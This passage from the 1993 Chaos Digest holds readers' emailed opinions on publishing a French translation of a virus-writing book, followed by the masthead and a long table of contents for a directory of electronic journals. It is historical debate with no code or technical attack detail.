to write viruses.  All they have to do is compile the code.  So any
twit with a self image problem can spread new viruses simply by
using the do-it-yourself package.  I've seen too many such viruses,
and such twits.  But I'm sure that in the overall scene, the French
issue of Ludwig's book is likely to have about as much effect as
the English version has had: "diddly-squat".

No doubt the publicity is nice, though. =:)


                        NO BIG HIDDEN SECRETS

Date: Wed Oct 28 18:35:13  1992
From: ROP@hacktic.nl

Viruses are only a threat if the general public does not understand
them. Most virus panics are caused by a this lack of knowledge. It's
very good that books like this are available, so that everyone that
wants to can have access to information that details how viruses
work.

There are NO big hidden secrets that could destroy the world, viruses
are simple programs that anyone with a good understanding of
operating systems can write. Virus writers don't need these books
anyway.

+++++
Rop Gonggrijp (rop@hacktic.nl)        Hardened and capable of making
fax: +31 20 6900968                        considerable trouble.


                        FOR MISCHIEVOUS PEOPLE

Date: Wed Oct 28 17:47:38 PST 1992
From: Pua_Yeow_Cheong.xssc@rxsgp.xerox.com (Yeow Cheong.)

I am a software engineer with Xerox but I am not familar with virus codes.
Anyway, here is my opinion regarding your mail.

I have never read the book you mentioned before but from the fact that the
it was censored in the US and it teaches you how to write virus, I can guess
that it must contain some harmful elements in it.

The problem with publishing the book for the newstand is that you cannot
control who gets the book. For all your well intentions, this book will most
likely also land up in the hands of those mischievous  people who are out to
create trouble. Then we will see a proliferation of new virus, starting with
France, maybe throughout the world. No matter what Kephart says about his new
theory, the fact that computer virus have spread to most computers in the
world  (Even my PC at home in Singapore has been infected before) is enough
proof that virus do spread effectively. And with networking becoming more and
more common, it will not be long before virus spread itself via networks.

Even though the virus can eventually be destroyed by current anti-virus
methods, but before these new virus can be  detected and all destroyed, who
knows how much destruction they will cause before that. And these information
they destroy might be important information in the banks or hospitals.

If your intention in publishing the book is to prevent virus infection
through knowing how virus work, I would suggest you control the sale and sell
only to licensed anti-virus software companies who need the information. If
you want to make the book for the newstand, then you should remove all the
parts teaching people how to write virus.

If your intention is not the above, my opinion is that you shouldn't publish
the book at all.

Please consider carefully before making your move. Good luck.


                    COMPUTER PROFESSIONALISM/ETHICS

Date: Tue Nov  3 14:49:12 CST 1992
From: cepek@vixvax.mgi.com ("Mike Cepek, MGI" )

I personally don't like many of the implications made in the article you
enclosed, "Making The News and Bookstands", in particular those related
to viruses not being a real threat.

I am not familiar with Mr. Kephart's work.  The conclusions stated in
the article don't surprise me all that much at face value.  However, I
feel that they are probably used out of context (and, I would assume,
without Mr. Kephart's permission) to further the ends of `chaos'.

Viruses affect real people and real companies, and have caused real
damage, resulting in real money and time lost.  The people affected
are innocent.  In far too many cases, the virus authors set out to
cause damage intentionally.

In my opinion, malicious viruses are bad.  To encourage them in any
way is also bad.  If it were me, I would not be involved in the release
of such information, since it is more likely to cause further harm than
good.

There are many sides to this issue, more that I care to go into here
(freedom of expression, general social benefits from releasing
confidential information, educational/research reasons, general moral
and ethical issues, computer professionalism/ethics, etc.).

I certainly cannot prevent "The Black Book" from being published, nor will
I try.  However, if it were me, I probably would find more constructive
things to do with my time and energy.

______________________________ Mike Cepek ______________________________


                            VIRII ARE "TOYS"

Date: Wed Nov  4 21:09:18 GMT 1992
From: hps@sdf.LoneStar.ORG (Holt Sorenson )

I believe firmly in the idea of free speech. I think that the publishing of
this book is not anything to worry about for several reasons.  I've seen many
of the virii that have resulted from this publication and they are not
anyworse than the majority of virri in the community now.  For the most part
they are overwriting, non-parisitic, non-resident programs that replicate.
The concepts behind virri are quite simple and any programmer with a couple
of years of experience can write a virus. A virus can even be programmed with
DOS's batch language.  Assembly is not by any means necessary, but it is the
best language because it allows full access to the machine's capabilities and
compiles the smallest code.

Bearing in mind that virii are "toys" that programmers play with, that free
speech is essential in democratic societies, that the ideas presented in that
book are not the most advanced in virus technology, and that the "adults" that
read the book will act responsibly, I see no problem with the publishing of
the book. If the book is a catalyst for a computer virus  epidemic in France,
then that is one of the consequences of releasing such informtation. Computers
users need to be prepared for that consequence.

Miscellaneous:

Are you guys into the hacker, phreaker, virus scene ? Why did
you decide to release the translated book ?


                         I FOUND VIRUSES DISGUSTING

Date: Thu Nov  5 11:51:15 CET 1992
From: EKRISTIA@estec.estec.esa.nl ("E. Kristiansen - WMS" )

On one hand, I find computer viruses disgusting, and I think most people
using computers for professional purposes would agree with me.

On the other hand, I am afraid that viruses are here to stay. The techniques
are sufficiently well known that anybody who really wants can put their hands
on them. One publication more or one less is not going to change that very
much. The only thing, to my opinion, which can inprove the picture slightly
is education, in the sense that potential virus-writers might be brought
to realize the conseqwences of what they are about to do. But social
behaviour is not very popular today in the western world.

I think the only thing computer professionals can do is defensive measures:
- make good and frequent backups so you can recover if contaminated
- be very careful about who has access to your computer, and what they put
  into the disc drive. Avoid any discs whose origin you do not trust.

This being said, I am not in favour of publishing your book, it's a bit like
publishing how to break into a house: Anybody can find out how to do it, but
reading a book on the subject might be an incentive to actually try it out.

The warning "Forbidden for readers not 18 years old" (I suppose you mean
"readers below 18 years"?) should be enough incentive for a lot of below-18's
to buy the book. If such a "warning" has any effect at all, it is likely
to be the opposite of the intended one.


                               LITTLE DANGER

Date: Thu Nov  5 12:18:30 MET 1992
From: bartjan@stack.urc.tue.nl (Bartjan Wattel )

I think that one major factor must be considered:

Are the sources that are listed the original sources, or were they 'reversed
engineered' ?

I think, that if the sources are original,most of them won't be very complex
nor very ingenoius. Having this in mind, I see no harm in publishing virus
listings. In fact, since virus-programming has several nice features and
is somewhat challenging, I think it could be very interesting finding out
how virusses work. But, there'll always be some people who modify some listing
and release it. Since the listings are not that complex, and any anti-virus
program will find it, I think there is little danger. I feel that all
companies should at least run a simple virus-detecting program once a day.

In my opinion, the problems lies in publishing very *smart* virus-codes.  At
that point, building an even smarter virus shouldn't be very difficult. This
could lead to problems when such virusses are being released.

So, my opinion: publish only the *easy* virus-codes, e.g. codes from long-
existing virusses that will be detected and removed by any know anti-virus
program.

I hope this helps you.  I'm always in for answering questions or joining a
discussion about viruses.

Bartjan Wattel at Eindhoven University of Technology, the Netherlands


                    I DID UNDERSTAND THE TITLE

Date: Thu Nov 12 09:32:00 EST 1992
From: CMARTIN@unode2.nswc.navy.mil ("PGE" )

   As to virus pathology, I agree that most common virus vector is exchanging
of disks as opposed to network connections.  Why, because it is easier to
create a virus that does only one thing, infect the next disk, than to have
one that can go from disk to net to disk.  Also, except for networks with
open access (colleges and the like) users have no reason to wish to harm each
other, so they won't try to create viruses.  Sure they may bring in a pirated
copy of tetris which is infected, but a virus that can identify the network
(I do believe that many different protocals exist) and do the necessary harm
is going to be alot longer than a simple virus, and therefore easier to spot.
Networked computers also run alot more anti-virus software than many home
users thereby making infection and transmission harder.

   The book.  Well I believe in free speech.  I was hoping to buy the book
here, but if it is censored then I guess I shall have to brush up on my
French (I did understand the title at least) and get that version.  Such
books might help the malicious, but it also let's the anti-virus forces see
what information is being used to write these viruses, and thereby be able to
combat the viruses more effectively.

   Finally, selling the book to those only 18 and older is sad.  This book is
now being lumped together with Madonna's new book (though I don't know if you
have to be 18 to buy that in France).


                             WRITE ONE YOURSELF

Date: Thu Nov 12 09:37:25 -0600 1992
From: sears@tree.egr.uh.edu (Paul S. Sears )

I think that a book such as this is a good thing to publish.  Viruses are
generally simple to write and any one with basic programming skills can
create such a beast.  It is their skill in programming and design that
determines how "sucessful" the virus is.  The general computing community
can better defend itself from the onslaught of virus attacks if they have
a deeper understanding on how a virus operates.  And what is the best way
to see how a virus operates?  Write one yourself.  Or, at least look
_real_ examples of virus code.

Banning knowledge because it may "enlighten" the un-enlightened, is something
I don't agree with.  I think that everyone should have the opportunity to
know everything they can.  Keeping the "secrets" of virus design to the
underground and/or professional circles leaves the everyday Joe User out in
the cold.  Knowledge is the best weapon and can be the best defense to such
a situation.  In the site that I manage, I make an effort to inform all of
my users of all possible security threats (related issue).  If there was a
threat of virus infection on our unix platforms, I would make every effort to
inform my users of what that threat is, and to help then understand the design
and intent of such threat.  Most learn by experimenting, like when I was
child, I used to tear apart _anything_ mechanical to understand how it worked.
I think the same applies here for virus code.  And besides, there are other
sources of virus code floating around.  If someone wants it bad enough, they
can easily get it.

--
Paul S. Sears                *  sears@uh.edu (NeXT Mail OK)
The University of Houston    *  suggestions@tree.egr.uh.edu (NeXT
Engineering Computing Center *  comments, complaints, questions)
NeXT System Administration   *  DoD#1967 '83 NightHawk 650SC


                         VIRUSES IN THE WILD

Date: Mon Nov 16 14:13:04 EST 1992
From: sara@gator.rn.com (Sara Gordon )

i ve not seen this -new- kephart study. the most recent one i have seen is
the one detailed in some conference proceedings. it is not a new study. i
did use it to document the 'viruses in the wild' portion of my recent
study on virus exchange bulletin boards.

i have not seen any of the book viruses, although i have the book. my
purchase of the book was 'documented' in the underground publication
phrack. hope you read the rebuttal, phrack40a, which corrected the many
glaring innacuracies in the original. better yet if you had not wasted
your time with the original.

increase knowledge with the publication of a translation of -that- book?
ah, c'mon. have you read that book? if you want to increase knowledge,
you could just translate the parts that tell about viruses. the book is
a do-it-yourself guide to writing viruses, enabling someone who has the
energy to type in the listings (or purchase the disks) to produce
viruses without knowing how to program. Now, tell me, of what purpose is
the type of info in this book regarding how viruses work to anyone who
does not know what the terms mean? the 'advance knowledge' might be more
readily achieved amongst the potential users of this book by publishing
instead some basic tenets of responsibility, ethics...

what exactly is the knowledge you are trying to advance? the only thing
this book deals with is how to write viruses, or more specifically how
to type in some codes and get them without really knowing why it works,
for without a basic understanding of programming, a person won't
understand the explanations of the book--and, if they have this
understanding they wont NEED this book to 'explain' it.

this book dont been banned anywhere that i know of. i dont know of any law
against publishing virus codes. however, you must be aware that it will
be used by people who want to experiment, that is if they have the
determination to type in that long code.

laws are another matter entirely, as are freedoms. i think the key issue
here is really responsibility. one has to decide which side of the fence
one wishes to reside on.

--
Talk to me about computer viruses.     sara@gator.rn.com
                                       SGordon@Dockmaster.ncsc.mil
                                       vfr@netcom.com
Sara Gordon      Fidonet 1:227/190     Virnet 9:10/0    9:101/0


                     REAL COMPLEXITY OF CREATION

Date: Sun Nov 22 18:50:18 EST 1992
From: btwalker@eos.ncsu.edu (aka drchaos )


   Problem is that there is always a threat.  However most people don't
consider themselves to be at risk until the media brings a gross distortion
of a viral threat to each and everyone of us.  Writing viruses is much more
difficult than slapping together some code and running it through a compiler.
It requires integrity checking and code evaluation to merge the best possible
combination of replication and anti-detection features.  With a manual that
tells one how to put together a virus, we may see an increase in defective,
mass destructive viruses that tend to annilate themselves, but i believe that
there will be few, if any, truly dangerous viruses released because of the
recent developments.

   Actually i believe that most viruses spread through the public BBS networks
that operate in this country.  Many thousands of files are transfered and
distributed all across the land, some without regard to the file's content.
i for one know of people who download a file from one system only to upload it
to another system.  A virus embedded in one of these files can spread very far
at 9600 bps.

   The reason most viruses don't spread very well across standard, non-human
motivated networks is due to the complexity of creating a computer virus.  The
only program that achieved this to my knowledge was the internet worm, which
was 3000 lines long, in C.  Thus most virus writers will stick to the
environment they are most familiar with and generally ignore the networks.
Physical exchange of disks will soon decline in infection percentages as more
and more computers are connected to networks and it is no longer nescessary to
exchange diskettes.

   Only the viruses that are written by dedicated indivuals will prosper.  The
others will fall victim to common bugs and uncommon situations that can occur
when a program is existing in close proximity with the hardware and operation
system.  Any virus can be detected and defeated given enough time to study it
and it's patterns of infection.  However the easist to detect are not the most
dangerous.  These viruses are most likely the creation of someone with a weak
sense of direction that somehow got lucky and created a working virus.  They
perhaps may suffer from a slighly anti-social outlook on life and merely want
to vent their frustration on the unsuspecting computer using populace.

   The dangerous viruses are those that wait and cause small changes in non-
essential files over an extended period of time.  These viruses are hard to
detect if successful and one can only develop a vaccine if one knows what to
look for.

   I believe that the spread of knowledge should not be deterred.  i approve
of distributing all knowledge even if the knowledge has potential disruptive
abilites.  As i have stated before, very few people will be able to create a
harmful working virus.  Those that do manage to produce one will have
developed a program in which it is compromised enough to not be effective in
modern computer environments.  Furthermore the knowledge may stimulate those
who are attempting to create better anti-viral software.

   From what i know of it, the black book contains examples of viral code,
all of which can be detected.  Since almost all of the viruses that could
potentially created by releasing the translation will be variants, all should
be easily detected and should not impose a greater risk to anyone with
sufficient anti-viral software.

   While being over the age of 18 does not garantee responsibility, it does
increase the chance that all who learn from it will have reached an age of
socialization that is necessary to properly use the knowledge to benefit and
not to detriment.

------------------------------

End of Chaos Digest #1.14
************************************

Chaos Digest               Lundi 22 Mars 1993          Volume 1 : Numero 15

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.15 (22 Mars 1993)
File 1--3e Ed. du Repert. des E-Journaux et Newsletters (Annonce)
File 2--Piratage a la francaise (reprint)
File 3--Vulnerabilite du finger Unix chez Commodore Amiga

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from cccf@altern.com. The editors may be contacted by
voice (+33 1 47874083), fax (+33 1 47877070) or S-mail at: Jean-Bernard
Condat, Chaos Computer Club France [CCCF], B.P. 155, 93404 St-Ouen Cedex,
France

Issues of ChaosD can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.91] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

Issues of ChaosD can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:
CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Thu Feb 11 13:17:49 EST 1993
From: 441495@acadvm1.uottawa.ca (MICHAEL STRANGELOVE )
Subject: File 1--3e Ed. du Repert. des E-Journaux et Newsletters (Annonce)


FYI/RFC - this will be released on the Net later next week - still editing
and tracking down some more hopefull leads. - Michael


 Introduction. . . . . . . . . . . . . . . . . . . . . . . . . .  9

 Reflections on Developments in Network-Based Electronic
      Serials: March 1992 -- March 1993. . . . . . . . . . . . . 12

 How To Retrieve This Directory From Networked Sources . . . . . 12
       Via Listserv. . . . . . . . . . . . . . . . . . . . . . . 12
       Via FTP . . . . . . . . . . . . . . . . . . . . . . . . . 13
       Accessing the Gopher/Telnet Server Version. . . . . . . . 13

 How To Subscribe to E-serials and Retrieve Back Issues. . . . . 13
       Subscribing to E-serials. . . . . . . . . . . . . . . . . 13
       Retrieving Back Issues. . . . . . . . . . . . . . . . . . 14
             Using FTP Mail Gateways . . . . . . . . . . . . . . 14
       Find Out More About LISTSERV. . . . . . . . . . . . . . . 15
       Retrieving E-Serials via FTP. . . . . . . . . . . . . . . 15
       Using FTP . . . . . . . . . . . . . . . . . . . . . . . . 16
       Connecting to a Node. . . . . . . . . . . . . . . . . . . 16
       Various Common FTP Commands and Their Use . . . . . . . . 17
       Find Out More About FTP . . . . . . . . . . . . . . . . . 18

 How To Submit an Entry to This Directory. . . . . . . . . . . . 18

 Networked Resources for Electronic Publication. . . . . . . . . 19
       Online Discussion Groups. . . . . . . . . . . . . . . . . 19
             Association of Electronic Discussion Groups and
                  Electronic Journals (ARACHNET) . . . . . . . . 19
             Association of Electronic Scholarly Journals
                  (AESJ-L) . . . . . . . . . . . . . . . . . . . 19
             Scholarly Electronic Journals and Electronic
                  Publishing Issues List . . . . . . . . . . . . 20
       Electronic Serials for Publishers and Editors . . . . . . 20
             CCNEWS - Campus Computing Newsletter. . . . . . . . 20
             EJOURNAL. . . . . . . . . . . . . . . . . . . . . . 20
       How to Start an E-Newsletter. . . . . . . . . . . . . . . 20
       Electronic Publishing on Networks: A Selective
            Bibliography of Recent Works . . . . . . . . . . . . 20
       Getting an ISSN for an Electronic Journal . . . . . . . . 25
       PACS Review Special Issue on Networked Based E-Serials. . 26

 Section 2:  Electronic Journals . . . . . . . . . . . . . . . . 28

 1. Arachnet Electronic Journal of Virtual Culture . . . . . . . 28

 2. Architronic: The Electronic Journal of Architecture. . . . . 29

 3. AXE. . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29

 4. Bryn Mawr Classical Review . . . . . . . . . . . . . . . . . 30

 5. Catalyst: The Community Services Catalyst. . . . . . . . . . 31

 6. Distance Education Online Symposium (DEOSNEWS) . . . . . . . 32

 7. Education Policy Analysis Archives . . . . . . . . . . . . . 32

 8. EJOURNAL . . . . . . . . . . . . . . . . . . . . . . . . . . 33

 11. Flora Online. . . . . . . . . . . . . . . . . . . . . . . . 35

 12. Interpersonal Computing and Technology Journal: An
      Electronic Journal for the 21st Century. . . . . . . . . . 35

 13. IOUDAIOS Review . . . . . . . . . . . . . . . . . . . . . . 36

 14. Issues In Science and Technology Librarianship. . . . . . . 37

 15. Journal of Computing in Higher Education. . . . . . . . . . 37

 16. Journal of the International Academy of Hospitality
      Research . . . . . . . . . . . . . . . . . . . . . . . . . 38

 17. Journal of Technology Education . . . . . . . . . . . . . . 39

 18. LIBRES. . . . . . . . . . . . . . . . . . . . . . . . . . . 39

 19. MC Journal - Journal of Academic Media Librarianship. . . . 40

 20. MeckJournal . . . . . . . . . . . . . . . . . . . . . . . . 40

 21. Modal Analysis: The International Journal of Analytical and
      Experimental Modal Analysis. . . . . . . . . . . . . . . . 41

 22. Music Theory Online (MTO) . . . . . . . . . . . . . . . . . 42

 23. New Horizons in Adult Education . . . . . . . . . . . . . . 42

 24. Online Chronicle of Distance Education and Communication. . 43

 25. Online Journal of Current Clinical Trials . . . . . . . . . 44

 26. Postmodern Culture. . . . . . . . . . . . . . . . . . . . . 45

 27. Postmodern Jewish Philosophy BITNETWORK . . . . . . . . . . 46

 28. PSYCHE: An Interdisciplinary Journal of Research on
      Consciousness. . . . . . . . . . . . . . . . . . . . . . . 47

 29. Psychology Graduate Student Journal: The PSYCGRAD Journal
      (PSYGRD-J) . . . . . . . . . . . . . . . . . . . . . . . . 47

 30. PSYCOLOQUY. . . . . . . . . . . . . . . . . . . . . . . . . 48

 31. Public-Access Computer Systems Review . . . . . . . . . . . 49

 32. RD: Graduate Research in the Arts . . . . . . . . . . . . . 50

 33. Religious Studies Publications Journal - CONTENTS . . . . . 51

 34. SOLSTICE: An Electronic Journal of Geography and
      Mathematics. . . . . . . . . . . . . . . . . . . . . . . . 52

 35. Surfaces. . . . . . . . . . . . . . . . . . . . . . . . . . 53

 36. Textual Studies in Canada . . . . . . . . . . . . . . . . . 55

 Section 3:  Electronic Newsletters. . . . . . . . . . . . . . . 56

 37. Acquisitions Librarians Electronic Network (ACQNET) . . . . 56

 38. A & G Information Services. . . . . . . . . . . . . . . . . 56

 39. AIDS Book Review Journal. . . . . . . . . . . . . . . . . . 57

 40. ALCTS Network News (AN2). . . . . . . . . . . . . . . . . . 58

 41. Amazons International . . . . . . . . . . . . . . . . . . . 58

 42. American Psychological Association's Research Funding
      Bulletin . . . . . . . . . . . . . . . . . . . . . . . . . 59

 43. Andrew View . . . . . . . . . . . . . . . . . . . . . . . . 60

 44. Armadillo Culture: The Journal of Modern Dasypodidae. . . . 60

 45. Arm The Spirit. . . . . . . . . . . . . . . . . . . . . . . 61

 46. ART COM . . . . . . . . . . . . . . . . . . . . . . . . . . 61

 47. Automatome. . . . . . . . . . . . . . . . . . . . . . . . . 62

 48. Bean Bag. . . . . . . . . . . . . . . . . . . . . . . . . . 62

 49. BEN (Botanical Electronic News) . . . . . . . . . . . . . . 63

 50. Between the Lines . . . . . . . . . . . . . . . . . . . . . 64

 51. Biomedical Library Acquisitions Bulletin (BLAB) . . . . . . 64

 52. Braille Forum . . . . . . . . . . . . . . . . . . . . . . . 64

 53. Braille Monitor . . . . . . . . . . . . . . . . . . . . . . 65

 54. Buffer. . . . . . . . . . . . . . . . . . . . . . . . . . . 65

 55. Cache Update. . . . . . . . . . . . . . . . . . . . . . . . 65

 56. CACTUS Newsletter (Capital Area Central Texas Unix
      Society) . . . . . . . . . . . . . . . . . . . . . . . . . 66

 57. Carolina. . . . . . . . . . . . . . . . . . . . . . . . . . 66

 58. CCNEWS - Campus Computing Newsletter. . . . . . . . . . . . 66

 59. CERFNet NEWS. . . . . . . . . . . . . . . . . . . . . . . . 67

 60. Chaos Digest (ChaosD) . . . . . . . . . . . . . . . . . . . 67

 61. ChE Electronic Newsletter . . . . . . . . . . . . . . . . . 68

 62. Chile News Database . . . . . . . . . . . . . . . . . . . . 68

 63. China News Digest . . . . . . . . . . . . . . . . . . . . . 69

 65. Chronic Fatigue Syndrome Electronic Newsletter (CFS-NEWS) . 70

 66. Citations for Serial Literature . . . . . . . . . . . . . . 70

 67. Class Four Relay Magazine . . . . . . . . . . . . . . . . . 71

 68. Computer Science Center Link. . . . . . . . . . . . . . . . 72

 69. Computer Underground Digest (CuD or Cu-Digest). . . . . . . 73

 70. Computing and Network News. . . . . . . . . . . . . . . . . 74

 71. Computists' Communique. . . . . . . . . . . . . . . . . . . 74

 72. Consortium Update . . . . . . . . . . . . . . . . . . . . . 75

 73. CORE. . . . . . . . . . . . . . . . . . . . . . . . . . . . 75

 74. Cosmic Update . . . . . . . . . . . . . . . . . . . . . . . 76

 75. CPSR/PDX Newsletter . . . . . . . . . . . . . . . . . . . . 76

 76. CRTNet - Communication Research and Theory Network. . . . . 77

 77. ctt-Digest: The comp.text.tex Newsgroup Digest. . . . . . . 77

 78. Cult of the Dead Cow. . . . . . . . . . . . . . . . . . . . 78

 79. Current Cites . . . . . . . . . . . . . . . . . . . . . . . 79

 80. Cyberspace Vanguard Magazine. . . . . . . . . . . . . . . . 79

 81. Dargonzine - The Magazine of the Dargon Project . . . . . . 80

 82. DATA ENTRIES. . . . . . . . . . . . . . . . . . . . . . . . 80

 83. Dateline: Starfleet . . . . . . . . . . . . . . . . . . . . 81

 84. DDN Management Bulletin . . . . . . . . . . . . . . . . . . 81

 85. DECNEWS for Education and Research. . . . . . . . . . . . . 82

 86. Deutschland Nachrichten . . . . . . . . . . . . . . . . . . 82

 87. DevelopNet News . . . . . . . . . . . . . . . . . . . . . . 82

 88. Digital Games Review. . . . . . . . . . . . . . . . . . . . 83

 89. Disaster Research . . . . . . . . . . . . . . . . . . . . . 83

 90. Donosy. . . . . . . . . . . . . . . . . . . . . . . . . . . 84

 91. Drosophila Information Newsletter . . . . . . . . . . . . . 85

 92. EFFector Online - The Electronic Frontier Foundation, Inc . 85

 93. Electronic AIR. . . . . . . . . . . . . . . . . . . . . . . 86

 94. Electronic Hebrew Users Newsletter (E-Hug). . . . . . . . . 86

 95. End Process . . . . . . . . . . . . . . . . . . . . . . . . 87

 96. Energy Ideas. . . . . . . . . . . . . . . . . . . . . . . . 87

 97. Energy Research in Israel Newsletter. . . . . . . . . . . . 88

 98. Erofile . . . . . . . . . . . . . . . . . . . . . . . . . . 88

 99. Ethnomusicology Research Digest . . . . . . . . . . . . . . 89

 100. EUVE: Electronic Newsletter of the EUVE Observatory. . . . 89

 101. FactSheet Five - Electric. . . . . . . . . . . . . . . . . 90

 102. FARNET Gazette . . . . . . . . . . . . . . . . . . . . . . 90

 103. Fineart Forum. . . . . . . . . . . . . . . . . . . . . . . 91

 104. Fine Art, Science and Technology News (F.A.S.T. News). . . 91

 105. FOREFRONTS . . . . . . . . . . . . . . . . . . . . . . . . 91

 106. Fulbright Educational Advising Newsletter (FULBNEWS) . . . 92

 107. FutureCulture FAQ. . . . . . . . . . . . . . . . . . . . . 93

 108. GLOSAS News (GLObal Systems Analysis and Simulating
      Association) . . . . . . . . . . . . . . . . . . . . . . . 93

 109. GNET - Global Networking . . . . . . . . . . . . . . . . . 94

 110. GNU's Bulletin:  Newsletter of the Free Software
      Foundation . . . . . . . . . . . . . . . . . . . . . . . . 94

 111. The Handicap Digest. . . . . . . . . . . . . . . . . . . . 95

 112. HICNet Newsletter (MEDNEWS - The Health InfoCom
      Newsletter). . . . . . . . . . . . . . . . . . . . . . . . 96

 113. High Weirdness by Email. . . . . . . . . . . . . . . . . . 96

 114. Holy Temple of Mass Consumption. . . . . . . . . . . . . . 97

 115. Hot Off the Tree (HOTT). . . . . . . . . . . . . . . . . . 97

 116. ICS Electrozine: Information, Control, Supply. . . . . . . 98

 117. IHOUSE-L International Voice Newsletter Prototype List . . 98

 118. IMPACT ONLINE. . . . . . . . . . . . . . . . . . . . . . . 99

 119. Information Networking News. . . . . . . . . . . . . . . . 99

 120. Instant Math Preprints (IMP) . . . . . . . . . . . . . . .100

 121. Intertext - An Electronic Fiction Magazine . . . . . . . .101

 122. Internet Monthly Report. . . . . . . . . . . . . . . . . .101

 123. IR-LIST Digest (IR-L Digest) . . . . . . . . . . . . . . .102

 124. I.S.P.O.B. Bulletin YSSTI. . . . . . . . . . . . . . . . .102

 125. Jonathan's Space Report. . . . . . . . . . . . . . . . . .103

 126. KIDLINK Newsletter . . . . . . . . . . . . . . . . . . . .103

 127. Laboratory Primate Newsletter. . . . . . . . . . . . . . .104

 128. Law and Politics Book Review . . . . . . . . . . . . . . .104

 129. Leonardo Electronic News . . . . . . . . . . . . . . . . .105

 130. Link Letter. . . . . . . . . . . . . . . . . . . . . . . .105

 131. List Review Service. . . . . . . . . . . . . . . . . . . .106

 132. LymeNet Newsletter . . . . . . . . . . . . . . . . . . . .106

 133. MAB Northern Sciences Network Newsletter . . . . . . . . .107

 134. Material Science in Israel Newsletter. . . . . . . . . . .107

 135. Matrix News. . . . . . . . . . . . . . . . . . . . . . . .108

 136. MichNet News (previously Merit Network News) . . . . . . .108

 137. MICnews. . . . . . . . . . . . . . . . . . . . . . . . . .109

 138. Navy News Service (NAVNEWS). . . . . . . . . . . . . . . .109

 139. NEARnet Newsletter . . . . . . . . . . . . . . . . . . . .110

 140. NEARnet this Month . . . . . . . . . . . . . . . . . . . .110

 141. NetMonth . . . . . . . . . . . . . . . . . . . . . . . . .111

 142. Network Audio Bits and Audio Software Review . . . . . . .111

 143. Network News . . . . . . . . . . . . . . . . . . . . . . .112

 144. Newsbrief. . . . . . . . . . . . . . . . . . . . . . . . .112

 145. Newsletter on Serials Pricing Issues . . . . . . . . . . .113

 146. Newsline . . . . . . . . . . . . . . . . . . . . . . . . .113

 147. NIBNews - A Monthly Electronic Bulletin About Medical
      Informatics. . . . . . . . . . . . . . . . . . . . . . . .114

 148. NLSNews Newsletter . . . . . . . . . . . . . . . . . . . .115

 149. OFFLINE. . . . . . . . . . . . . . . . . . . . . . . . . .115

 150. Old English Computer-Assisted Language Learning Newsletter
      (OE-CALL). . . . . . . . . . . . . . . . . . . . . . . . .116

 151. Organized Thoughts . . . . . . . . . . . . . . . . . . . .116

 152. PIGULKI. . . . . . . . . . . . . . . . . . . . . . . . . .117

 153. Political Analysis and Research Cooperation (PARC) News
      Bulletin . . . . . . . . . . . . . . . . . . . . . . . . .118

 154. Practical Anarchy Online . . . . . . . . . . . . . . . . .118

 155. Principia Cybernetica Newsletter . . . . . . . . . . . . .118

 156. Prompt . . . . . . . . . . . . . . . . . . . . . . . . . .119

 157. Project Gutenberg Newsletter . . . . . . . . . . . . . . .120

 158. Public-Access Computer Systems News. . . . . . . . . . . .120

 159. Purple Thunderbolt of Spode (PURPS). . . . . . . . . . . .121

 160. QUANTA - Science, Fact, and Fiction. . . . . . . . . . . .121

 161. REACH - Research and Educational Applications of Computers
      in the Humanities. . . . . . . . . . . . . . . . . . . . .122

 162. ReNews (RELCOM NEWS) . . . . . . . . . . . . . . . . . . .123

 163. Rezo, bulletin irregulomadaire du RQSS . . . . . . . . . .123

 164. RFE/RL Research Institute Daily Report . . . . . . . . . .124

 165. RFE/RL Research Institute Research Bulletin. . . . . . . .124

 166. Risks-Forum Digest . . . . . . . . . . . . . . . . . . . .125

 167. RSI Network Newletter. . . . . . . . . . . . . . . . . . .125

 168. SCHOLAR. . . . . . . . . . . . . . . . . . . . . . . . . .126

 169. Scream Baby. . . . . . . . . . . . . . . . . . . . . . . .127

 170. SCUP BITNET NEWS . . . . . . . . . . . . . . . . . . . . .127

 171. SCUPMA-L: Society of College and University Planners,
      Mid-Atlantic Region. . . . . . . . . . . . . . . . . . . .128

 172. Sense of Place . . . . . . . . . . . . . . . . . . . . . .128

 173. Simulation Digest. . . . . . . . . . . . . . . . . . . . .129

 174. Simulations Online . . . . . . . . . . . . . . . . . . . .129

 175. Socjety Journal. . . . . . . . . . . . . . . . . . . . . .130

 176. Somalia News Update. . . . . . . . . . . . . . . . . . . .130

 177. SOUND News and Arts. . . . . . . . . . . . . . . . . . . .131

 178. Sound Newsletter . . . . . . . . . . . . . . . . . . . . .131

 179. South Florida Environmental Reader . . . . . . . . . . . .132

 180. South Scanner Satellite Services Chart . . . . . . . . . .132

 181. SpaceViews . . . . . . . . . . . . . . . . . . . . . . . .133

 182. SunFlash . . . . . . . . . . . . . . . . . . . . . . . . .133

 183. SURFPUNK Technical Journal . . . . . . . . . . . . . . . .133

 184. TapRoot Reviews Electronic . . . . . . . . . . . . . . . .134

 187. Temptation of Saint Anthony. . . . . . . . . . . . . . . .136

 190. Terminometro Electronico . . . . . . . . . . . . . . . . .137

